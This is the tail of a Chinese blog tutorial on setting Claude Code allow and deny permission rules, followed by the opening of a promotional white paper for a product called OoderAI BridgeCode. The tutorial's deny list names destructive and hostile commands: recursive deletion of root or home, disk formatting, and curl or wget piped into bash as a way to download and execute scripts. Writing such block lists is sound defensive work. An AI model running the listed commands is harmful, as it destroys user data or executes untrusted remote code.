<li>编辑 <code>~/.claude/settings.json</code> 或 <code>.claude/settings.local.json</code></li>
<li>在 <code>permissions.allow</code> 数组中添加上述命令</li>
<li>保存后配置自动生效</li>
</ul>
</li>
</ol>
<h4 data-id="heading-19">2.5.2 Deny 类别推荐配置（高危命令黑名单）</h4>
<p>建议将以下危险命令添加到 <strong>Deny</strong> 类别中，完全阻止执行：</p>
<p><strong>文件删除类（破坏性）</strong></p>
<ul>
<li><code>Bash(rm:-rf:*)</code> - 递归删除文件</li>
<li><code>Bash(rm:-rf:/)</code> - 删除根目录（极其危险）</li>
<li><code>Bash(rm:-rf:~)</code> - 删除用户主目录</li>
<li><code>Bash(sudo:rm:*)</code> - 使用 sudo 删除文件</li>
</ul>
<p><strong>磁盘操作类（不可逆）</strong></p>
<ul>
<li><code>Bash(mkfs:*)</code> - 格式化文件系统</li>
<li><code>Bash(dd:*)</code> - 磁盘复制（可能覆盖数据）</li>
<li><code>Bash(fdisk:*)</code> - 磁盘分区工具</li>
</ul>
<p><strong>权限提升类（安全风险）</strong></p>
<ul>
<li><code>Bash(sudo:*)</code> - 所有 sudo 命令</li>
<li><code>Bash(su:*)</code> - 切换用户</li>
<li><code>Bash(chmod:777:*)</code> - 设置危险权限</li>
</ul>
<p><strong>网络下载执行类（恶意软件风险）</strong></p>
<ul>
<li><code>Bash(curl:*:|:bash)</code> - 下载并执行脚本</li>
<li><code>Bash(curl:*:|:sh)</code> - 下载并执行 shell 脚本</li>
<li><code>Bash(wget:*:|:bash)</code> - wget 下载并执行</li>
<li><code>Bash(wget:*:|:sh)</code> - wget 下载并执行 shell</li>
</ul>
<p><strong>系统关键操作（危险）</strong></p>
<ul>
<li><code>Bash(reboot)</code> - 重启系统</li>
<li><code>Bash(shutdown:*)</code> - 关闭系统</li>
<li><code>Bash(init:0)</code> - 系统关机</li>
</ul>
<p><strong>配置方式</strong>:</p>
<ol>
<li>
<p><strong>通过 <code>/permissions</code> 界面添加</strong>:</p>
<ul>
<li>输入 <code>/permissions</code> 打开权限管理界面</li>
<li>切换到 <strong>Deny</strong> 类别</li>
<li>选择 "Add a new rule..."</li>
<li>依次输入上述命令格式（如 <code>Bash(rm:-rf:*)</code>）</li>
<li>按 Enter 确认添加</li>
</ul>
</li>
<li>
<p><strong>通过配置文件批量添加</strong>（推荐）:</p>
<ul>
<li>编辑 <code>~/.claude/settings.json</code> 或 <code>.claude/settings.local.json</code></li>
<li>在 <code>permissions.deny</code> 数组中添加上述命令</li>
<li>保存后配置自动生效</li>
</ul>
</li>
</ol>
<p><strong>注意</strong>: 命令格式中使用冒号 <code>:</code> 分隔命令和参数，而不是空格。例如 <code>Bash(rm:-rf:*)</code> 表示 <code>rm -rf *</code> 命令。</p>
<hr/>
<h2 data-id="heading-20">三、常见问题与调试技巧</h2>
<h3 data-id="heading-21">3.1 权限配置不生效</h3>
<p><strong>问题</strong>: 配置了白名单,但 AI 仍然要求确认</p>
<p><strong>排查步骤</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 检查配置文件是否存在</span>
<span class="hljs-built_in">ls</span> -la ~/.claude/settings.json
<span class="hljs-built_in">ls</span> -la ./.claude/settings.local.json

<span class="hljs-comment"># 2. 检查 JSON 格式是否正确</span>
jq . ~/.claude/settings.json
jq . ./.claude/settings.local.json

<span class="hljs-comment"># 3. 查看当前生效的权限</span>
<span class="hljs-comment"># 在 Claude Code 交互式终端中输入:</span>
&gt; /permissions
<span class="hljs-comment"># 然后切换到 Allow/Ask/Deny 类别查看对应权限规则</span>

<span class="hljs-comment"># 4. 检查命令模式是否匹配</span>
<span class="hljs-comment"># 例如: 配置了 "npm test" 但实际执行 "npm test --verbose"</span>
<span class="hljs-comment"># 解决: 改为 "Bash(npm:test:*)" 或 "Bash(npm:test:*)"</span>
</code></pre>
<p><strong>常见错误</strong>:</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// ❌ 错误: 模式不匹配</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"Bash(git:status)"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
<span class="hljs-comment">// AI 执行: git status -sb (不匹配)</span>

<span class="hljs-comment">// ✅ 正确: 使用通配符</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"Bash(git:status:*)"</span><span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-22">3.2 配置文件格式错误</h3>
<p><strong>问题</strong>: 配置文件格式不正确,导致权限无法加载</p>
<p><strong>排查步骤</strong>:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 使用 jq 验证 JSON 格式</span>
jq . ~/.claude/settings.json

<span class="hljs-comment"># 2. 检查命令格式是否正确</span>
<span class="hljs-comment"># 正确格式: "Bash(命令:参数)"</span>
<span class="hljs-comment"># 错误格式: "bash command" 或 "Bash(command param)"</span>
</code></pre>
<hr/>
<h2 data-id="heading-23">四、总结与最佳实践</h2>
<h3 data-id="heading-24">4.1 核心要点回顾</h3>
<p>通过本文,我们深入探讨了 Claude Code 的权限管理系统:</p>
<p><strong>权限管理(Permission)</strong></p>
<ul>
<li><strong>必要性</strong>: 平衡安全与效率,既防止危险操作,又避免重复确认</li>
<li><strong>机制</strong>: 白名单 + 黑名单 + 默认策略</li>
<li><strong>配置</strong>: 全局配置 + 项目配置,优先级明确</li>
<li><strong>实践</strong>: 批量授权安全命令,阻断危险操作</li>
</ul>
<p><strong>金句回顾</strong>:</p>
<blockquote>
<p>"Permission 权限管理:既保障安全,又使用丝滑"</p>
</blockquote>
<h3 data-id="heading-25">4.2 最佳实践清单</h3>
<p><strong>权限配置最佳实践</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown">✅ DO(推荐做法)
<span class="hljs-bullet">-</span> 批量授权常用安全命令(cat、ls、grep、git status 等)
<span class="hljs-bullet">-</span> 阻断高危命令(rm -rf、sudo、mkfs、dd 等)
<span class="hljs-bullet">-</span> 项目配置提交到 Git,团队共享
<span class="hljs-bullet">-</span> 定期回顾和更新权限规则
<span class="hljs-bullet">-</span> 使用模式匹配而不是精确匹配(灵活性)

❌ DON'T(避免的做法)
<span class="hljs-bullet">-</span> 一刀切禁止所有命令(影响效率)
<span class="hljs-bullet">-</span> 白名单包含危险命令(安全隐患)
<span class="hljs-bullet">-</span> 忘记配置权限持久化(每次重新设置)
<span class="hljs-bullet">-</span> 过于复杂的模式匹配(难以维护)
</code></pre>
<p><strong>安全配置最佳实践</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown">✅ DO(推荐做法)
<span class="hljs-bullet">-</span> 黑名单优先级高于白名单
<span class="hljs-bullet">-</span> 危险命令完全禁止,不提供确认选项
<span class="hljs-bullet">-</span> 定期审计 AI 执行的命令
<span class="hljs-bullet">-</span> 配置文件权限设置为 600(仅自己可读写)

❌ DON'T(避免的做法)
<span class="hljs-bullet">-</span> 为了方便将所有命令加入白名单
<span class="hljs-bullet">-</span> 忽略权限配置的安全警告
<span class="hljs-bullet">-</span> 使用明文存储敏感信息
</code></pre>
<h3 data-id="heading-26">4.3 快速配置指南</h3>
<p><strong>第 1 步: 创建配置文件(今天完成)</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 创建目录</span>
<span class="hljs-built_in">mkdir</span> -p ~/.claude

<span class="hljs-comment"># 2. 创建全局配置文件</span>
<span class="hljs-built_in">cat</span> &gt; ~/.claude/settings.json &lt;&lt; <span class="hljs-string">EOF
{
  "permissions": {
    "allow": [
      "Bash(cat:*)",
      "Bash(ls:*)",
      "Bash(grep:*)",
      "Bash(git:status)",
      "Bash(git:log:*)",
      "Bash(git:diff:*)"
    ],
    "deny": [
      "Bash(rm:-rf:*)",
      "Bash(sudo:*)",
      "Bash(mkfs:*)"
    ]
  }
}
EOF</span>
</code></pre>
<p><strong>第 2 步: 验证配置(今天完成)</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 启动 Claude Code</span>
claude

<span class="hljs-comment"># 2. 查看权限配置</span>
&gt; /permissions
<span class="hljs-comment"># 打开权限管理界面，切换到 Allow/Ask/Deny 类别查看对应权限</span>

<span class="hljs-comment"># 3. 测试安全命令(应该直接执行,无需确认)</span>
&gt; 查看 README.md

<span class="hljs-comment"># 4. 测试危险命令拦截</span>
&gt; 执行 <span class="hljs-built_in">rm</span> -rf <span class="hljs-built_in">test</span>
<span class="hljs-comment"># [应该被阻断]</span>
</code></pre>
<h3 data-id="heading-27">4.4 常见配置模板</h3>
<p><strong>模板 1: Web 开发项目</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(npm:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(yarn:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(pnpm:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:status)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:log:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:diff:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:ps)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:logs:*)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(npm:publish)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(docker:rm:*)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>模板 2: Android 开发项目</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(./gradlew:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(adb:logcat)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(adb:shell:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:status)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:log:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(git:diff:*)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(adb:uninstall:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(adb:shell:rm:*)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>模板 3: Python 数据科学项目</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"permissions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"allow"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(python:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(pip:install:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(jupyter:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(pytest:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(black:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(flake8:*)"</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"deny"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-string">"Bash(pip:uninstall:*)"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-string">"Bash(rm:-rf:venv)"</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h2 data-id="heading-28">参考资料</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fcli-reference" target="_blank" title="https://code.claude.com/docs/zh-CN/cli-reference" ref="nofollow noopener noreferrer">Claude Code CLI 参考</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.claude.com%2Fdocs%2Fzh-CN%2Fiam" target="_blank" title="https://code.claude.com/docs/zh-CN/iam" ref="nofollow noopener noreferrer">Claude Code 身份和访问管理</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgoogle.github.io%2Fstyleguide%2Fshellguide.html" target="_blank" title="https://google.github.io/styleguide/shellguide.html" ref="nofollow noopener noreferrer">Bash Scripting Best Practices</a></li>
</ul>
<hr/>
<blockquote>
<p>💡 <strong>思考题</strong>: 你的项目中,哪些命令应该加入白名单?哪些命令必须禁止?如何平衡安全与效率?</p>
</blockquote>
<p>🔗 <strong>相关文章</strong>:</p>
<ul>
<li><a href="https://juejin.cn/post/7602454700503646249" target="_blank" title="https://juejin.cn/post/7602454700503646249">上一篇: 团队宪法: CLAUDE.md 使用技巧</a></li>
</ul>
<hr/>
<p><em>如果这篇文章对你有帮助,欢迎点赞、收藏、分享!有任何问题或建议,欢迎在评论区留言讨论。让我们一起学习,一起成长!</em></p>
<p><em>也欢迎访问我的<a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">个人主页</a>发现更多宝藏资源</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OoderAI BridgeCode 产品白皮书——全方位赋能企业编程升级]]></title>    <link>https://juejin.cn/post/7603142147643392043</link>    <guid>https://juejin.cn/post/7603142147643392043</guid>    <pubDate>2026-02-05T12:51:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603142147643392043" data-draft-id="7603221478473482282" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OoderAI BridgeCode 产品白皮书——全方位赋能企业编程升级"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-05T12:51:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OoderAI BridgeCode 产品白皮书——全方位赋能企业编程升级
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:51:44.000Z" title="Thu Feb 05 2026 12:51:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在AI技术飞速迭代、企业数字化转型进入深水区的今天，编程效率、技术适配性与架构灵活性成为制约企业发展的核心痛点。多数企业面临“已有系统与新AI工具脱节”“代码开发效率低下”“技术栈绑定导致升级困难”“团队工作流程无法适配AI时代需求”等问题，亟需一款能够打通技术断层、赋能团队高效编程、兼顾灵活性与实用性的代码框架解决方案。</p>
<p>ooderAI BridgeCode 应运而生，聚焦企业核心编程需求，以“AI确定性代码框架构建”为核心，通过自学习能力、全流程适配能力与开源灵活特性，助力企业快速搭建专属代码体系，衔接已有应用与前沿AI技术，降低开发成本、提升编程效率，推动企业编程工作向AI化、高效化、标准化转型。</p>
<h2 data-id="heading-1">一、产品概述：AI驱动的企业专属代码框架解决方案</h2>
<p>ooderAI BridgeCode 是一款专为企业打造的AI确定性代码框架生成工具，核心定位是“为企业快速构建属于自己的AI确定性代码框架，助力企业编程”，充当已有应用系统与 ooderAI 生态之间的“桥梁”，同时为企业编程团队提供AI时代的全流程支撑。</p>
<p>不同于传统代码生成工具，BridgeCode 以“企业个性化适配”为核心，无需企业迁就标准化模板，而是主动学习企业技术特点与业务需求，生成贴合企业实际、可直接落地的代码框架与工作体系，真正实现“工具适配企业，而非企业适配工具”，让每一家企业都能拥有专属的高效编程解决方案。</p>
<h3 data-id="heading-2">1.1 核心价值</h3>
<ul>
<li><strong>降本增效</strong>：自动生成全套适配代码，减少手动编码工作量，缩短开发周期，降低企业人力成本与时间成本；</li>
<li><strong>打破断层</strong>：无缝衔接企业已有应用与 ooderAI 代码，解决新旧系统兼容难题，实现技术体系的平滑过渡；</li>
<li><strong>个性适配</strong>：基于企业自身代码特点与技术路线自学习，生成专属代码框架，适配企业个性化技术需求；</li>
<li><strong>AI赋能</strong>：适配AI时代编程需求，优化团队工作流程，搭建专属 skills 能力包，推动编程工作向智能化升级；</li>
<li><strong>灵活无绑定</strong>：开源设计，无技术栈绑定，支持企业自主扩展与升级，保护企业现有技术投资。</li>
</ul>
<h2 data-id="heading-3">二、产品核心能力：全方位赋能企业编程升级</h2>
<p>ooderAI BridgeCode 依托AI技术与开源生态，构建两大核心能力，覆盖“代码生成”与“流程优化”全场景，从技术层面到管理层面，全方位助力企业编程效率与质量双提升，适配AI时代企业编程的核心需求。</p>
<h3 data-id="heading-4">2.1 自学习的 BridgeCode 代码生成能力</h3>
<p>BridgeCode 核心亮点在于“自学习、自适应”，无需人工手动配置大量参数，即可自动贴合企业技术体系，生成全套可直接运行的 BridgeCode 代码，实现已有应用与 ooderAI 代码的无缝衔接，彻底解决“代码不兼容、衔接繁琐”的行业痛点。</p>
<p>其核心工作流程采用Web化可视化设计（适配企业Web端操作习惯，界面简洁易上手），具体如下：</p>
<ol>
<li><strong>数据采集</strong>：自动采集企业已有代码库、技术文档、开发规范等相关数据，涵盖代码风格、命名规范、技术栈选型、架构模式等核心信息，无需人工手动上传；</li>
<li><strong>智能学习</strong>：通过内置AI算法，深度分析企业代码特点、技术路线与开发习惯，建立企业专属技术模型，精准捕捉企业编程核心需求与适配要点；</li>
<li><strong>代码生成</strong>：基于学习到的企业技术模型，自动生成全套 BridgeCode 代码，包括衔接层代码、适配层代码、兼容层代码等，代码风格、技术规范与企业现有代码完全一致，无需人工二次修改；</li>
<li><strong>无缝衔接</strong>：生成的 BridgeCode 代码可直接嵌入企业已有应用系统，实现与 ooderAI 代码的无缝对接，支持实时调试、在线修改（Web端可视化调试界面，操作便捷），确保衔接稳定无异常；</li>
<li><strong>动态优化</strong>：企业代码体系、技术路线发生变更时，BridgeCode 可自动重新学习，更新代码生成逻辑，确保代码框架始终与企业技术体系同步适配，无需重新搭建框架。</li>
</ol>
<p>Web化美化适配：代码生成过程实时可视化展示，生成结果支持Web端在线预览、复制、导出，调试界面支持语法高亮、错误提示、一键修复，贴合企业开发人员Web端操作习惯，提升使用体验。</p>
<h4 data-id="heading-5">2.1.1 代码生成核心业务流程</h4>
<p>以下为 BridgeCode 自学习代码生成及无缝衔接的核心业务流程示意图</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/402443daf5b04774a830b9245915518a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=du1aYDY5sVio8nxdloZVqYSsyRU%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h3 data-id="heading-6">2.2 AI时代工作流程优化与 skills 能力包搭建</h3>
<p>BridgeCode 不止于代码生成，更聚焦企业编程团队的全流程效率提升，结合AI时代编程特点，为企业优化现有工作流程，并辅助搭建全套 skills 能力包，让团队工作更贴合AI时代需求，实现“流程标准化、能力体系化”。</p>
<h4 data-id="heading-7">2.2.1 工作流程智能推荐与优化</h4>
<p>基于企业已有技术架构、团队规模、开发模式与工作流程，BridgeCode 通过AI分析，精准识别现有流程中的冗余环节、效率瓶颈（如沟通成本高、分工不清晰、重复工作多等），推荐并生成符合AI时代特点的标准化编程工作流程。</p>
<p>优化后的流程具备以下特点：</p>
<ul>
<li><strong>AI协同</strong>：融入AI辅助编程环节，如代码自动审查、错误自动排查、重复代码自动优化，减少人工干预，提升编程准确性；</li>
<li><strong>分工清晰</strong>：明确团队各角色（开发、测试、运维）的职责与协作节点，打通团队协作断层，降低沟通成本；</li>
<li><strong>高效迭代</strong>：简化流程环节，缩短开发、调试、上线的周期，支持快速迭代，适配企业快速响应市场需求的场景；</li>
<li><strong>灵活适配</strong>：流程可根据企业业务变化、团队调整进行自定义修改（Web端可视化流程配置界面，拖拽即可调整节点），无需复杂操作。</li>
</ul>
<h4 data-id="heading-8">2.2.2 团队工作流程优示意图</h4>
<p>以下为 BridgeCode 优化后的AI时代企业编程团队工作流绘图</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f62bbaacc1d14ab3b2228f2a3420fcf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=1MU65YOFLxpSzBC%2FhE21ag47YXU%3D" alt="请在此添加图片描述" loading="lazy"/></p>
<p>​</p>
<h4 data-id="heading-9">2.2.2 全套 skills 能力包辅助搭建</h4>
<p>skills 能力包是企业编程团队的“能力手册”，涵盖编程规范、技术技巧、工具使用、问题解决方案等核心内容，BridgeCode 结合企业技术栈与工作流程，辅助企业搭建全套、专属的 skills 能力包，助力团队能力标准化、提升团队整体编程水平。</p>
<p>能力包搭建核心支持：</p>
<ul>
<li><strong>内容个性化</strong>：基于企业技术路线（如Java、Vue、React等）与编程需求，自动生成贴合企业实际的 skills 内容，避免冗余、无用信息；</li>
<li><strong>体系化梳理</strong>：将 skills 内容按“编程规范、技术技巧、工具使用、错误排查、适配方案”等模块分类梳理，结构清晰，便于团队查询、学习；</li>
<li><strong>实时更新</strong>：当企业技术栈升级、工作流程优化或行业出现新技术时，自动更新 skills 能力包内容，确保团队掌握最新、最适配的技术能力；</li>
<li><strong>Web化共享</strong>：skills 能力包支持Web端在线查看、搜索、下载、分享，团队成员可随时查阅学习，实现知识共享，提升团队整体效率。</li>
</ul>
<h2 data-id="heading-10">三、产品核心特点：开源灵活，全方位适配企业需求</h2>
<p>ooderAI BridgeCode 以“企业需求为核心”，结合AI技术与开源生态，打造四大核心特点，兼顾灵活性、实用性、易用性，适配不同规模、不同技术路线的企业需求，同时注重Web化美化适配，提升用户操作体验。</p>
